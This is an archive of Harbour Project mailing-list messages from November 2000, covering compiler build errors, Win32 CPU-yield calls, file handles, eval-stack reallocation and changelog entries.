In-Reply-To: <001101c05360$38ca6d10$8604d2cc@san.rr.com>
Message-ID: <3A19A1C6.3859.65C63C8@localhost>

On 20 Nov 2000, at 18:10, Brian Hays wrote:

> Perfect. Thanks!

In fact, at the bottom of each message, you'll find a link to the 
listinfo page, which leads you to the archives.

> http://www.matrixlist.com/mailman/listinfo/harbour


-- 
              Phil Barnett  mailto:midnight@the-oasis.net
                       WWW  http://www.the-oasis.net/
                  FTP Site  ftp://ftp.the-oasis.net

From harbour@lists.harbour-project.org  Mon Nov 20 22:57:03 2000
From: harbour@lists.harbour-project.org (Ron Pinkas)
Date: Mon Nov 20 22:57:03 2000
Subject: [Harbour] Help on a full build from CVS snapshot...
In-Reply-To: <000801c05338$bf04a300$ae4b0a0a@default>
Message-ID: <LOBBKAFMMFGJIKLMEPAKGEEFDHAA.ron@profit-master.com>

Richard,

Check that you don't get an error message from Bison. The harboury.c file is
being generated by Bison from harbour.y.

You should have an environment variable pointing Bison to bison.simple like:

SET BISON_SIMPLE=C:\bison\bison.simple

Ron

P.S. You don't have to have/use Flex, if you use B32_SLEX.bat instead of
MAKE_B32.bat.

> I've downloaded the CVS snapshot.
> My Borland 5.5 is working great.
> I've got Flex and Bison in \harbour\bin
>
> When I run make_b32.bat in get :
>
> MAKE Version 5.2  Copyright (c) 1987, 2000 Borland
>  bison -d  source\compiler\harbour.y   -oobj\b32\harboury.c
>  bcc32 -c -Iinclude -d  -O2   -oobj\b32\harboury.obj  obj\b32\harboury.c
> Borland C++ 5.5 for Win32 Copyright (c) 1993, 2000 Borland
> Error E2194: Could not find file 'obj\b32\harboury.c'
>
> ** error 1 ** deleting obj\b32\harboury.obj
>
> Where have I gone wrong?


From harbour@lists.harbour-project.org  Tue Nov 21 01:51:02 2000
From: harbour@lists.harbour-project.org (Richard Crosby)
Date: Tue Nov 21 01:51:02 2000
Subject: [Harbour] Help on a full build from CVS snapshot...
Message-ID: <000601c0535e$7f7b6b80$b84b0a0a@default>

Thanks, I got it working.  I had to have both bison and flex in the \Harbour
dir and not the \Harbour\bin dir.   Now I'll try the SimpLex compile.

Do I still need to have the TASM32.EXE file?




From harbour@lists.harbour-project.org  Tue Nov 21 02:17:02 2000
From: harbour@lists.harbour-project.org (Chen Kedem)
Date: Tue Nov 21 02:17:02 2000
Subject: [Harbour] Re: win98 and TBrowse
References: <200011210041.CAA02794@post-office.synel>
Message-ID: <3A1A211A.4D90@synel.co.il>

David,

> Could somebody who has Windows API documentation please look for an
> API call that can be used to force a console application to give up
> CPU time?

------------------------
void Sleep( DWORD dwMilliseconds );
"suspend the execution of the current thread for a specified interval"
------------------------
DWORD SleepEx( DWORD dwMilliseconds, BOOL bAlertable );
"causs the current threead to enter a wait state until one of the
following occurs:
- An I/O completion callback function is called
- An asynchronous procedure call (APC) is queued to the thread
- The time-out interval elapses"
------------------------
"Thee Yield function is obsoleete. ... only for compatibility with
16-bit versions of Windows. In the Win32-based API , this function
does nothing"
------------------------

  Chen.

From harbour@lists.harbour-project.org  Tue Nov 21 02:35:04 2000
From: harbour@lists.harbour-project.org (Dave Pearson)
Date: Tue Nov 21 02:35:04 2000
Subject: [Harbour] Harbour been cracked?
In-Reply-To: <3A19A0EC.2050100@upol.com.br>; from nelson@upol.com.br on Mon, Nov 20, 2000 at 08:08:44PM -0200
References: <004d01c05278$2899dfe0$0100007f@sl.conex.net> <3A19A0EC.2050100@upol.com.br>
Message-ID: <20001121073416.B29496@hagbard.davep.org>

[Quotes rearranged to have a more logical flow]

On Mon, Nov 20, 2000 at 08:08:44PM -0200, Nelson Bertolino Junior wrote:

> Luiz Rafael Culik Guimaraes wrote:
> 
> > After 3 years developing and implemented solutions ERP wi FW, the
> > Microsiga Company(It an Brazilian Software House) has internaly
> > developed( or adapted from the Harbour) with a cost aproximadally US $ 2
> > million an 64 bit compiler ( I dont belive in this number,32 can be)
> > called advPL, or Protheus. It generate an P-Code in C++ that is compiled
> > with Borland C++ 5.0. It surely that can be compiled under Linux,Solaris
> > and other platforms. It doesnt sound that you know.
>
> I've never knew anything about this, but considering the source
> (MICROSIGA), it could be true. They are a little bit dangerous ...

Please choose your words wisely. There's nothing in the above that actually
says that the product in question is in any way related to harbour (for
starters, it says they've been developing for three years, harbour is only
half that age) and simply saying that it "could be true" because a company
is a "little but dangerous" doesn't help at all.

All you're doing here is turning the rumour mill. This isn't helpful to
harbour, quite the opposite in fact.

If someone has facts, they should post them. If someone has rumour they
should convert them into facts or not post them at all (and they should
possibly consider apologising to the company in question if the rumour isn't
convertible into a fact).

-- 
The Harbour Project: A free software Clipper compatible compiler
Home Page..........: http://www.harbour-project.org/
FAQ................: http://www.harbour-project.org/faq/harbour.html
My harbour page....: http://www.hagbard.demon.co.uk/harbour/

From harbour@lists.harbour-project.org  Tue Nov 21 05:42:02 2000
From: harbour@lists.harbour-project.org (Juan Agustin Barriga)
Date: Tue Nov 21 05:42:02 2000
Subject: [Harbour] C / C++
References: <200011201806_MC2-BB98-B020@compuserve.com>
Message-ID: <004101c053af$cea7cea0$456410ac@jharrier>

John,
            sadly enough, you're right on this. Maybe that is why I see so
LITTLE C++ code arround!

Regards
Harrier

----- Original Message -----
From: "John Skelton" <John_Skelton@compuserve.com>
To: <harbour@lists.harbour-project.org>
Sent: Monday, November 20, 2000 7:05 PM
Subject: [Harbour] C / C++


Harrier,

Using C++ for Harbour would probably reduce the number of people
who contributed. :-(

It might also mean some of the code would be the kind of clever (*)
stuff you've surely seen. :-(

(*) appallingly awful, I really mean. (Abuse of operators, inheritance,
overloading, inline, etc.)

Sadly, all too often C++ reminds me of a WOL (**) - that's for sure
mostly the fault of the particular developer but in some cases the
semantics of C++ are not exactly intuitive.

(**) Write-Only Language

John.
_______________________________________________
Harbour mailing list
Harbour@lists.harbour-project.org
http://www.matrixlist.com/mailman/listinfo/harbour

Thank you for participating in The Harbour Project.  Be sure to check
http://www.Harbour-Project.org



From harbour@lists.harbour-project.org  Tue Nov 21 06:26:01 2000
From: harbour@lists.harbour-project.org (Paul Tucker)
Date: Tue Nov 21 06:26:01 2000
Subject: [Harbour] Re: win98 and TBrowse
References: <200011210041.CAA02794@post-office.synel> <3A1A211A.4D90@synel.co.il>
Message-ID: <01ad01c053ad$96f91dd0$b671fea9@QUARRY>

Sleep() presents a forced waiting period which we certainly don't want to
do.  SleepEx() sounds more promissing, but I don't think anything in Harbour
qualifies as an i/o callback or APC.  The only way this call would be
useful, is if the Windows Terminal layer uses either of these modes.  IOW -
we need to try it.

Drop this into the inkey loop and you'll know in a big hurry if we can use
it:

SleepEx( 3000, 1 );

Paul
----- Original Message -----
From: "Chen Kedem" <niki@synel.co.il>
To: <harbour@lists.harbour-project.org>
Sent: Tuesday, November 21, 2000 2:15 AM
Subject: [Harbour] Re: win98 and TBrowse


> David,
>
> > Could somebody who has Windows API documentation please look for an
> > API call that can be used to force a console application to give up
> > CPU time?
>
> ------------------------
> void Sleep( DWORD dwMilliseconds );
> "suspend the execution of the current thread for a specified interval"
> ------------------------
> DWORD SleepEx( DWORD dwMilliseconds, BOOL bAlertable );
> "causs the current threead to enter a wait state until one of the
> following occurs:
> - An I/O completion callback function is called
> - An asynchronous procedure call (APC) is queued to the thread
> - The time-out interval elapses"
> ------------------------
> "Thee Yield function is obsoleete. ... only for compatibility with
> 16-bit versions of Windows. In the Win32-based API , this function
> does nothing"
> ------------------------
>
>   Chen.



From harbour@lists.harbour-project.org  Tue Nov 21 06:54:03 2000
From: harbour@lists.harbour-project.org (Brian Hays)
Date: Tue Nov 21 06:54:03 2000
Subject: [Harbour] Filehandles
Message-ID: <000901c05362$0971fea0$8604d2cc@san.rr.com>

In win32, fcreate and fopen work great with long filenames and our file
functions.
However, when I pass these to api functions like GetFileTime(), the function
fails.

The first handle produced by fOpen is 3 (I opened several files to get up to
7 to make sure this wasn't a stdout problem).
The first handle produced by a wrapper to Windoze CreateFile() can be
anywhere between 40 and 142.

Can anyone tell me what I forgot to read?  The api help doesn't.  When did
filehandles become something else?

Is there a chance of our file functions working with such api calls?
This also points out that a lot of the Win api FiveWin functions I've
written really should be moved to Harbour....

Brian Hays
Abacus Data Systems, Inc



From harbour@lists.harbour-project.org  Tue Nov 21 07:45:04 2000
From: harbour@lists.harbour-project.org (Juan Agustin Barriga)
Date: Tue Nov 21 07:45:04 2000
Subject: [Harbour] Harbour been cracked?
References: <004d01c05278$2899dfe0$0100007f@sl.conex.net> <3A19A0EC.2050100@upol.com.br>
Message-ID: <00c301c053c1$0657e130$456410ac@jharrier>

dangerous??? To whom? Microsiga is a TOP ERP provider & technological leader
in Brazil. They have invested BIG resources to maintain their xBase legacy,
and now own the most advanced xBase derivates, Protheus. They have proved
that there is a way to keep in pace with technology without throwing away
millions of lines of xBase code.

Regards
Harrier

----- Original Message -----
From: "Nelson Bertolino Junior" <nelson@upol.com.br>
To: <harbour@lists.harbour-project.org>
Sent: Monday, November 20, 2000 6:08 PM
Subject: Re: [Harbour] Harbour been cracked?


> Friends,
>
> I've never knew anything about this, but considering the source
> (MICROSIGA), it could be true. They are a little bit dangerous ...
>
> Regards,
> Nelson
>
> Luiz Rafael Culik Guimaraes wrote:
>
> > Dear Friends
> >
> > I´ve got the follow information from a Brazilian Harbour/Clipper User
> >
> >
> >> Após 3 anos desenvolvendo e implementando soluções ERP >com FW, a
Microsiga
> >> (conhece?) desenvolveu internamente (ou adaptou a partir >do Harbour,
não
> >
> > sei
> >
> >> ainda) a um custo aproximado de 2 milhões de dólares um >compilador de
64
> >> bits (não acredito neste número. 32 pode ser...) chamado >advPL, ou
> >
> > Protheus.
> >
> >> Gera um p-code em C++ que é então compilado com o >Borland C++ 5.0.
Claro,
> >> pode ser compilado em Linux, Solaris ou outros bichos. Soa >familiar?
> >
> > After 3 years developing and implemented solutions ERP wi FW, the
Microsiga
> > Company(It an Brazilian Software House) has internaly developed( or
adapted
> > from the Harbour) with a cost aproximadally US $ 2 million an 64 bit
> > compiler ( I don´t belive in this number,32 can be) called advPL, or
> > Protheus. It generate an P-Code in C++ that is compiled with Borland C++
> > 5.0. It surely that can be compiled under Linux,Solaris and other
platforms.
> > It doesn´t sound that you know.
> >
> >
> > Regards
> >
> > Luiz Rafael Culik
> >
> > Regards from Brazil
> >
> > Luiz Rafael Culik
> >
> > _______________________________________________
> > Harbour mailing list
> > Harbour@lists.harbour-project.org
> > http://www.matrixlist.com/mailman/listinfo/harbour
> >
> > Thank you for participating in The Harbour Project.  Be sure to check
> > http://www.Harbour-Project.org
> >
> >
> >
>
>
>
> _______________________________________________
> Harbour mailing list
> Harbour@lists.harbour-project.org
> http://www.matrixlist.com/mailman/listinfo/harbour
>
> Thank you for participating in The Harbour Project.  Be sure to check
> http://www.Harbour-Project.org
>


From harbour@lists.harbour-project.org  Tue Nov 21 09:19:02 2000
From: harbour@lists.harbour-project.org (Chen Kedem)
Date: Tue Nov 21 09:19:02 2000
Subject: [Harbour] Re: win98 and TBrowse
References: <200011210041.CAA02794@post-office.synel>
Message-ID: <3A1A83B3.6E39@synel.co.il>

Paul,

> Drop this into the inkey loop and you'll know in a big hurry if we
> can use it:
>
> SleepEx( 3000, 1 );

this would only make things worse (I think), if the problem is CPU
hoging, then you should call Sleep() every X times inside the waiting
loop but not all the time because then your application would sleep
most of the time and would do no useful work at all.

  Chen.

From harbour@lists.harbour-project.org  Tue Nov 21 10:08:01 2000
From: harbour@lists.harbour-project.org (Night Walker)
Date: Tue Nov 21 10:08:01 2000
Subject: [Harbour] MAKE_B32  error?

I'm try build Harbour, the error log 

        bcc32 -c -Iinclude -d  -O2   -oobj\b32\gtapi.obj  source\rtl\gtapi.c  
Borland C++ 5.5.1 for Win32 Copyright (c) 1993, 2000 Borland
source\rtl\gtapi.c:
Error E2380 source\rtl\gtapi.c 227: Unterminated string or character
constant in function hb_gtBoxD
Error E2129 source\rtl\gtapi.c 227: Character constant must be one or two
characters long in function hb_gtBoxD
Error E2121 source\rtl\gtapi.c 228: Function call missing ) in function
hb_gtBoxD
Error E2380 source\rtl\gtapi.c 230: Unterminated string or character
constant in function hb_gtBoxD
Error E2129 source\rtl\gtapi.c 230: Character constant must be one or two
characters long in function hb_gtBoxD
Error E2121 source\rtl\gtapi.c 232: Function call missing ) in function
hb_gtBoxD
Error E2380 source\rtl\gtapi.c 256: Unterminated string or character
constant in function hb_gtBoxS
Error E2129 source\rtl\gtapi.c 256: Character constant must be one or two
characters long in function hb_gtBoxS
Error E2121 source\rtl\gtapi.c 257: Function call missing ) in function
hb_gtBoxS
Error E2380 source\rtl\gtapi.c 259: Unterminated string or character
constant in function hb_gtBoxS
Error E2129 source\rtl\gtapi.c 259: Character constant must be one or two
characters long in function hb_gtBoxS
Error E2121 source\rtl\gtapi.c 261: Function call missing ) in function
hb_gtBoxS
*** 12 errors in Compile ***

** error 1 ** deleting obj\b32\gtapi.obj
NightWalker....



From harbour@lists.harbour-project.org  Tue Nov 21 11:05:03 2000
From: harbour@lists.harbour-project.org (rglab)
Date: Tue Nov 21 11:05:03 2000
Subject: [Harbour] Random gpfs
References: <200011171721_MC2-BB48-AF05@compuserve.com> <3A1971DB.2E627140@imid.med.pl> <004b01c0532d$c2cc8170$8604d2cc@san.rr.com>
Message-ID: <3A1A9E37.9D8D7468@imid.med.pl>

Brian Hays wrote:

> My earlier question and some of John's were related the dynamic stack
> issues.
> If the stack gets reallocated during the lifetime of the function because
> another function is called that does a lot, there would be a problem, right?
> Are the stack reallocations possible here or are there safeguards?

  Only pointers returned by hb_param() functions are affected by the
stack reallocation - the location of parameter items can change however
their value doesn't change. All hb_parXXX() functions return a value of
a parameter. 

  Notice also that we have two functions that return parameter pointer
(which I have mixed incorrectly in my previous message, sorry)
hb_param() returns a direct pointer to a given parameter,
hb_itemParam() returns a pointer to an item allocated dynamically with
duplicated value of a parameter item, so hb_itemParam() is basically
equal to 
#define hb_itemParam( i ) hb_itemNew( hb_param( i ) )
This way hb_itemParam() is _not_ affected by stack reallocation however
the returned pointer have to be released on function exit (if it is not
needed) with hb_itemRelease() or it can be stored internally after
locking it with hb_gcLockItem().

  I am looking at this eval stack issue - I can change the current code
into a linked lists however it requires some more work because all
(hb_stack.pPos - 1) expressions need to be located and replaced with
something else. This affects also parameters handling (hb_stack.pBase +
n) becomes invalid.
I want aslo to join this major change with removing a NIL parameter
placed in every function call because it is also related to the eval
stack handling. I want also change a little an object's message handling
to make it similar to function call.
Current logic:
push Object
push Message (this swaps items on the eval stack)
push <parameters>
send

into

push Symbol
push Object
Push <parameters>
send

HB_P_MESSAGE will be still needed in pre- and post- operations (++, +=,
etc) to keep current logic in message handling - optimisation of object
evaluation:
object( counter() ):message++
issues.

Regards, Ryszard

From harbour@lists.harbour-project.org  Tue Nov 21 11:27:02 2000
From: harbour@lists.harbour-project.org (John Skelton)
Date: Tue Nov 21 11:27:02 2000
Subject: [Harbour] Random gpfs
Message-ID: <200011211126_MC2-BBA4-5080@compuserve.com>

Ryszard & Victor,

Thanks - I will check my code.

John.

From harbour@lists.harbour-project.org  Tue Nov 21 11:29:02 2000
From: harbour@lists.harbour-project.org (John Skelton)
Date: Tue Nov 21 11:29:02 2000
Subject: [Harbour] Win32 Sleep/SleepEx
Message-ID: <200011211126_MC2-BBA4-507F@compuserve.com>

Paul,

Wouldn't a time of zero be OK, especially with SleepEx()?

John.

From harbour@lists.harbour-project.org  Tue Nov 21 12:08:01 2000
From: harbour@lists.harbour-project.org (Ron Pinkas)
Date: Tue Nov 21 12:08:01 2000
Subject: [Harbour] 2000-11-21 08:55 UTC+0800 Ron Pinkas <ron@profit-master.com>
In-Reply-To: <200011211126_MC2-BBA4-507F@compuserve.com>
Message-ID: <LOBBKAFMMFGJIKLMEPAKOEEHDHAA.ron@profit-master.com>

2000-11-21 08:55 UTC+0800 Ron Pinkas <ron@profit-master.com>
   * source/pp/ppcomp.c
   * source/compiler/harbour.c
     * Corrected compiler warnings.

   * source/compiler/harbour.slx
     * Small optimization in handling of s_sLastBlock

   * tests/tstblock.prg
     + Added complex early macro test.

From harbour@lists.harbour-project.org  Tue Nov 21 12:39:02 2000
From: harbour@lists.harbour-project.org (David G. Holm)
Date: Tue Nov 21 12:39:02 2000
Subject: [Harbour] win98 and TBrowse
In-Reply-To: <00c301c05355$cb64f290$b671fea9@QUARRY>
References: <3A165F71.7B3E12E0@libero.it> <200011201744.eAKHiRG03907@thor.parrett.net> <200011201824.eAKIOKG07796@thor.parrett.net>
Message-ID: <200011211738.eALHcPG03735@thor.parrett.net>

** Reply to message from "Paul Tucker" <ptucker@sympatico.ca> on Mon,
20 Nov 2000 19:55:51 -0500

> The only way we will get this to work reliably, is to switch to real mode,
> release the slice, and switch back to protected mode.

So how does one go about doing that? And is that likely to fix the "CPU
Hog" problem on NT?
-- 
David G. Holm, Set Captain and all around
Harbour Project Clipper Compatibility fanatic.

From harbour@lists.harbour-project.org  Tue Nov 21 12:51:04 2000
From: harbour@lists.harbour-project.org (Guy Roussin)
Date: Tue Nov 21 12:51:04 2000
Subject: [Harbour] Error with last cvs
Message-ID: <3A1AB5D6.6B32C2AF@teledetection.fr>

Hello Harbour,

1) I notice with last cvs (flex version) a parse error 
during compilation (fine with build 0.35).

 // (...) 
 #define FNC_NUM_MOD(n)     aFonc[n][1] 
 // (...)
 if FNC_NUM_MOD(nI)[1]==nM-1           // Error here !!!
 // (...)

harbour uc.prg /n /p /es2 /IC:\HARBOUR\INCLUDE
Harbour Compiler 0.35i (Build 35) (2000.10.23)
Copyright 1999-2000, http://www.harbour-project.org
Compiling 'uc.prg' and generating preprocessed output to 'uc.ppo'...
uc.prg(395) Error E0030  Syntax error: "parse error at '1'"
(...)

The problem seems to be in the pp here is the line after pp !

 if aFonc[nI][12]"1"==nM-1


2) 

I try to compile with slex but i got this log 
(sorry if i missed something about GET):

MAKE Version 5.2  Copyright (c) 1987, 2000 Borland
	bcc32 -c -Iinclude;source\compiler;source\macro -d -DHARBOUR_USE_WIN_GTAPI -O2   -Iobj\b32 -oobj\b32\hbslex.obj  source\compiler\hbslex.c  
harbour@lists.harbour-project.orgBorland C++ 5.5 for Win32 Copyright (c) 1993, 2000 Borland
source\compiler\hbslex.c:
Error E2451 source\compiler\harbour.slx 272: Undefined symbol 'GET'
Error E2141 source\compiler\harbour.slx 272: Declaration syntax error
Error E2190 source\compiler\harbour.slx 272: Unexpected }
Error E2190 source\compiler\harbour.slx 272: Unexpected }
Error E2190 source\compiler\harbour.slx 273: Unexpected }
Error E2109 source\compiler\simplex.c 211: Not an allowed type
*** 6 errors in Compile ***

** error 1 ** deleting obj\b32\hbslex.obj


Thanks,

-- 
Guy Roussin

From harbour@lists.harbour-project.org  Tue Nov 21 13:04:01 2000
From: harbour@lists.harbour-project.org (Ron Pinkas)
Date: Tue Nov 21 13:04:01 2000
Subject: [Harbour] Error with last cvs
In-Reply-To: <3A1AB5D6.6B32C2AF@teledetection.fr>
Message-ID: <LOBBKAFMMFGJIKLMEPAKIEEIDHAA.ron@profit-master.com>

Guy,

Thanks for the info, it is a PP problem, and I'll post a fix soon.

As to your SimpLex build error, you need to issue a B32_SLEX CLEAN first!
Because harboury.c need to be generated from harbour.sly rather then
harbour.y.

Ron

> Hello Harbour,
>
> 1) I notice with last cvs (flex version) a parse error
> during compilation (fine with build 0.35).
>
>  // (...)
>  #define FNC_NUM_MOD(n)     aFonc[n][1]
>  // (...)
>  if FNC_NUM_MOD(nI)[1]==nM-1           // Error here !!!
>  // (...)
>
> harbour uc.prg /n /p /es2 /IC:\HARBOUR\INCLUDE
> Harbour Compiler 0.35i (Build 35) (2000.10.23)
> Copyright 1999-2000, http://www.harbour-project.org
> Compiling 'uc.prg' and generating preprocessed output to 'uc.ppo'...
> uc.prg(395) Error E0030  Syntax error: "parse error at '1'"
> (...)
>
> The problem seems to be in the pp here is the line after pp !
>
>  if aFonc[nI][12]"1"==nM-1
>
>
> 2)
>
> I try to compile with slex but i got this log
> (sorry if i missed something about GET):
>
> MAKE Version 5.2  Copyright (c) 1987, 2000 Borland
> 	bcc32 -c -Iinclude;source\compiler;source\macro -d
> -DHARBOUR_USE_WIN_GTAPI -O2   -Iobj\b32 -oobj\b32\hbslex.obj
> source\compiler\hbslex.c
> harbour@lists.harbour-project.orgBorland C++ 5.5 for Win32
> Copyright (c) 1993, 2000 Borland
> source\compiler\hbslex.c:
> Error E2451 source\compiler\harbour.slx 272: Undefined symbol 'GET'
> Error E2141 source\compiler\harbour.slx 272: Declaration syntax error
> Error E2190 source\compiler\harbour.slx 272: Unexpected }
> Error E2190 source\compiler\harbour.slx 272: Unexpected }
> Error E2190 source\compiler\harbour.slx 273: Unexpected }
> Error E2109 source\compiler\simplex.c 211: Not an allowed type
> *** 6 errors in Compile ***
>
> ** error 1 ** deleting obj\b32\hbslex.obj
>
>
> Thanks,
>
> --
> Guy Roussin


From harbour@lists.harbour-project.org  Tue Nov 21 13:24:01 2000
From: harbour@lists.harbour-project.org (David G. Holm)
Date: Tue Nov 21 13:24:01 2000
Subject: [Harbour] Filehandles
In-Reply-To: <000901c05362$0971fea0$8604d2cc@san.rr.com>
Message-ID: <200011211823.eALINCG07741@thor.parrett.net>

** Reply to message from "Brian Hays" <bhays@abacuslaw.com> on Mon, 20
Nov 2000 18:23:19 -0800

> Can anyone tell me what I forgot to read?  The api help doesn't.  When did
> filehandles become something else?

The 32bit Windows API doesn't use the same type of file handles as the
C API. The C API (open, read, write, etc.) uses file handles of type
int, but the 32bit Windows api uses file handles of type HANDLE, which
is defined in WTYPES.H as typedef void __RPC_FAR *HANDLE; And the HANDLE
type is not only used for files, but also for processes and threads (and
probably a whole lot more).

So if you want to use GetFileTime(), you're going to have to open the
file using CreateFile().
-- 
David G. Holm, Set Captain and all around
Harbour Project Clipper Compatibility fanatic.

From harbour@lists.harbour-project.org  Tue Nov 21 13:25:03 2000
From: harbour@lists.harbour-project.org (David G. Holm)
Date: Tue Nov 21 13:25:03 2000
Subject: [Harbour] Re: win98 and TBrowse
In-Reply-To: <01ad01c053ad$96f91dd0$b671fea9@QUARRY>
References: <200011210041.CAA02794@post-office.synel> <3A1A211A.4D90@synel.co.il>
Message-ID: <200011211824.eALIOeG07855@thor.parrett.net>

** Reply to message from "Paul Tucker" <ptucker@sympatico.ca> on Tue,
21 Nov 2000 06:24:19 -0500

> Drop this into the inkey loop and you'll know in a big hurry if we can use
> it:
> 
> SleepEx( 3000, 1 );

That causes a three second delay open every invocation of the idle
function.
-- 
David G. Holm, Set Captain and all around
Harbour Project Clipper Compatibility fanatic.

From harbour@lists.harbour-project.org  Tue Nov 21 13:31:02 2000
From: harbour@lists.harbour-project.org (David G. Holm)
Date: Tue Nov 21 13:31:02 2000
Subject: [Harbour] Win32 Sleep/SleepEx
In-Reply-To: <200011211126_MC2-BBA4-507F@compuserve.com>
Message-ID: <200011211830.eALIUnG08319@thor.parrett.net>

** Reply to message from John Skelton <John_Skelton@compuserve.com> on
Tue, 21 Nov 2000 11:26:00 -0500

> Wouldn't a time of zero be OK, especially with SleepEx()?

I tried SleepEx( 0, 1 ) and it appears to work exactly like a yield()
function would, if one existed. And according to "Programming Windows
95", 4th edition, by Charles Petzold, Sleep( 0 ) does the same thing:

   "A parameter of 0 to the Sleep function causes the thread to forfeit
the remainder of its time slice."

So I'm going to change from SleepEx( 0, 1 ) to Sleep( 0 ) and commit
the change.
-- 
David G. Holm, Set Captain and all around
Harbour Project Clipper Compatibility fanatic.

From harbour@lists.harbour-project.org  Tue Nov 21 13:43:02 2000
From: harbour@lists.harbour-project.org (David G. Holm)
Date: Tue Nov 21 13:43:02 2000
Subject: [Harbour] ChangeLog 2000-11-21 13:40 UTC-0400 David G. Holm <dholm@jsd-llc.com>
Message-ID: <200011211842.eALIgkG09293@thor.parrett.net>

2000-11-21 13:40 UTC-0400 David G. Holm <dholm@jsd-llc.com>
   * source/rtl/idle.c
     + Added Sleep(0) for 32bit Windows mode to forfeit the
       remainder of the current time slice in hb_releaseCPU().
-- 
David G. Holm, Set Captain and all around
Harbour Project Clipper Compatibility fanatic.

From harbour@lists.harbour-project.org  Tue Nov 21 15:19:02 2000
From: harbour@lists.harbour-project.org (Maurilio Longo)
Date: Tue Nov 21 15:19:02 2000
Subject: [Harbour] Win32 Sleep/SleepEx
References: <200011211830.eALIUnG08319@thor.parrett.net>
Message-ID: <3A1AD899.365FE1BD@libero.it>

Hi,

just one thing from idle.c

 if( ! s_bIamIdle )
   {
      s_bIamIdle = TRUE;
      hb_releaseCPU();
      hb_gcCollectAll();
   
I think we should first call garbage collector and then release cpu.

regards.



"David G. Holm" ha scritto:
> 
> ** Reply to message from John Skelton <John_Skelton@compuserve.com> on
> Tue, 21 Nov 2000 11:26:00 -0500
> 
> > Wouldn't a time of zero be OK, especially with SleepEx()?
> 
> I tried SleepEx( 0, 1 ) and it appears to work exactly like a yield()
> function would, if one existed. And according to "Programming Windows
> 95", 4th edition, by Charles Petzold, Sleep( 0 ) does the same thing:
> 
>    "A parameter of 0 to the Sleep function causes the thread to forfeit
> the remainder of its time slice."
> 
> So I'm going to change from SleepEx( 0, 1 ) to Sleep( 0 ) and commit
> the change.
> --
> David G. Holm, Set Captain and all around
> Harbour Project Clipper Compatibility fanatic.
> _______________________________________________
> Harbour mailing list
> Harbour@lists.harbour-project.org
> http://www.matrixlist.com/mailman/listinfo/harbour
> 
> Thank you for participating in The Harbour Project.  Be sure to check
> http://www.Harbour-Project.org

-- 

 __________                   
|  |  | |__| md2520@mclink.it 
|_|_|_|____| Team OS/2 Italia

From harbour@lists.harbour-project.org  Tue Nov 21 15:29:01 2000
From: harbour@lists.harbour-project.org (David G. Holm)
Date: Tue Nov 21 15:29:01 2000
Subject: [Harbour] Win32 Sleep/SleepEx
In-Reply-To: <3A1AD899.365FE1BD@libero.it>
References: <200011211830.eALIUnG08319@thor.parrett.net>
Message-ID: <200011212028.eALKSDG18024@thor.parrett.net>

** Reply to message from Maurilio Longo <maurilio.longo@libero.it> on
Tue, 21 Nov 2000 21:18:33 +0100

> I think we should first call garbage collector and then release cpu.

I don't know why it's the other way around, so if nobody objects in the
next day or two, please feel free to go ahead and make that change.
-- 
David G. Holm, Set Captain and all around
Harbour Project Clipper Compatibility fanatic.

From harbour@lists.harbour-project.org  Tue Nov 21 17:50:04 2000
From: harbour@lists.harbour-project.org (JF Lefebvre)
Date: Tue Nov 21 17:50:04 2000
Subject: [Harbour] 2000-11-21 23:42 UTC-0100 JFL (mafact) <jfl@mafact.com>
Message-ID: <200011212249.XAA22728@pyxis.wanadoo.be>

2000-11-21 23:42 UTC-0100 JFL (mafact) <jfl@mafact.com>
   * source/vm/classes.c
     * minor modif after the last Stack tests
     * :EVAL forgot to release one created item (thkx Marek)
   * source/vm/eval.c
     * One possible PHB_ITEM use after stack realloc.. fixed (thkx 
Antonio)
   * source/vm/arrayshb.c
     * One possible PHB_ITEM use after stack realloc.. fixed (thkx 
Antonio)


Best regards,

J. Lefebvre,
Bruxelles,
Belgium


From harbour@lists.harbour-project.org  Tue Nov 21 18:40:03 2000
From: harbour@lists.harbour-project.org (John Skelton)
Date: Tue Nov 21 18:40:03 2000
Subject: [Harbour] Random gpfs
Message-ID: <200011211838_MC2-BBBE-B713@compuserve.com>

Ryszard,

"hb_itemParam() is _not_ affected by stack reallocation however
the returned pointer have to be released on function exit (if it is not
needed) with hb_itemRelease() or it can be stored internally after
locking it with hb_gcLockItem()."

Aha!  In some cases I need to add the GC lock.  No problem (now that
I know <g>).

Thanks!

BTW, a linked list stack would not be my first choice.

OTOH, a stack which moves around also isn't...

Couldn't we make it 1MB or something for now (by default) and work on
other parts of Harbour. :-)

John.

From harbour@lists.harbour-project.org  Tue Nov 21 19:23:02 2000
From: harbour@lists.harbour-project.org (Paul Tucker)
Date: Tue Nov 21 19:23:02 2000
Subject: [Harbour] Re: win98 and TBrowse
References: <200011210041.CAA02794@post-office.synel> <3A1A211A.4D90@synel.co.il> <200011211824.eALIOeG07855@thor.parrett.net>
Message-ID: <002301c0541a$1cff4c30$b671fea9@QUARRY>

David/John/Chen

SleepEx(3000,1) works as I figured.  ie: We don't have the 2 states referred
to in the docs.  OK, so Sleep(0) (as I've read in the rest of the thread -
and which I didn't think about) Sounds like what we need.

Well done guys.

Paul

----- Original Message -----
From: "David G. Holm" <dholm@jsd-llc.com>
To: <harbour@lists.harbour-project.org>
Sent: Tuesday, November 21, 2000 1:24 PM
Subject: Re: [Harbour] Re: win98 and TBrowse


> ** Reply to message from "Paul Tucker" <ptucker@sympatico.ca> on Tue,
> 21 Nov 2000 06:24:19 -0500
>
> > Drop this into the inkey loop and you'll know in a big hurry if we can
use
> > it:
> >
> > SleepEx( 3000, 1 );
>
> That causes a three second delay open every invocation of the idle
> function.
> --
> David G. Holm, Set Captain and all around
> Harbour Project Clipper Compatibility fanatic.



From harbour@lists.harbour-project.org  Tue Nov 21 21:40:04 2000
From: harbour@lists.harbour-project.org (Ron Pinkas)
Date: Tue Nov 21 21:40:04 2000
Subject: [Harbour] 2000-11-21 18:35 UTC+0800 Ron Pinkas <ron@profit-master.com>
In-Reply-To: <200011211823.eALINCG07741@thor.parrett.net>
Message-ID: <LOBBKAFMMFGJIKLMEPAKAEELDHAA.ron@profit-master.com>

2000-11-21 18:35 UTC+0800 Ron Pinkas <ron@profit-master.com>
   * source/pp/ppcomp.c
     * Corrected 1 compiler warning.

   * source/pp/ppcore.c
     + Added s_bArray support logic to WorkDefine()

   * source/rtl/idle.c
     * Reversed order of hb_gcCollectAll() and hb_releaseCPU();

From harbour@lists.harbour-project.org  Tue Nov 21 21:41:02 2000
From: harbour@lists.harbour-project.org (Ron Pinkas)
Date: Tue Nov 21 21:41:02 2000
Subject: [Harbour] Error with last cvs
